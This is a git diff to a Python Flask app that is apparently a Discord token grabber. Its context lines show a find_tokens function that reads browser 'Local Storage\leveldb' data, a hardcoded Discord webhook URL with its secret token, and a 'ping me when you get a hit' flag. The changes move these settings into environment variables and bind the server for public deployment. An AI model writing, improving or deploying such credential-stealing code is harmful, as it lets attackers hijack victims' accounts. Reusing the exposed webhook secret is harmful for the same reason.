@@ -3,15 +3,14 @@ import os
 import re
 import json
 from urllib.request import Request, urlopen
-from urllib.error import HTTPError
 
 app = Flask(__name__)
 
 # Your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1222071436580225055/vv3ODEp3REer37NytAbJSiAbg9kgXPhNavIH4l-pLN43Xz__K-p99ylgvuN-zB8fhdTc'
+WEBHOOK_URL = os.getenv('WEBHOOK_URL', 'https://discord.com/api/webhooks/1222071436580225055/vv3ODEp3REer37NytAbJSiAbg9kgXPhNavIH4l-pLN43Xz__K-p99ylgvuN-zB8fhdTc')
 
 # Mentions you when you get a hit
-PING_ME = False
+PING_ME = os.getenv('PING_ME', False)
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
@@ -81,4 +80,4 @@ def index():
     return 'Script executed successfully!'
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
